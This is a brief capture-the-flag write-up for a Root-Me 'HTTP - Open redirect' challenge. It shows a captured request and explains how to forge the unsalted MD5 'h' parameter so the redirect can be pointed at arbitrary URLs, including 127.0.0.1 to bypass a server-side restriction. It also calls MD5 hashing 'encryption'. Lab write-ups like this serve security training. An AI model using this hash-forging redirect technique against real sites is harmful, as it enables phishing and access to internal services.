# HTTP - Open redirect

ctrl + u -> find '?url' or similar word

***

Button clicking generates this request

```
GET /web-serveur/ch52/?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134 HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://challenge01.root-me.org/web-serveur/ch52/?url=https://facebook.com&h=be8b09f7f1f66235a9c91986952483f0
Cookie: _ga_SRYSKX09J7=GS1.1.1661060653.11.1.1661060933.0.0.0; _ga=GA1.1.841472709.1660615125
Upgrade-Insecure-Requests: 1
```

https://facebook.com -> md5 encryption a023cfbf5f1c39bdf8407f28b60cd134

then

https://www.google.com -> md5 encryption 8ffdefbdec956b595d257f0aaeefd623

I used this site: https://www.tunnelsup.com/hash-analyzer/ https://10015.io/tools/md5-encrypt-decrypt

\->

then I can manipulate the url flow. ?url=https://www.google.com\&h=8ffdefbdec956b595d257f0aaeefd623

\->

how to use

?url=http://127.0.0.1

h=5c016e8f0f95f039102cbe8366c5c7f3

for server side restriction bypass

\->

?url=http://127.0.0.1\&h=5c016e8f0f95f039102cbe8366c5c7f3
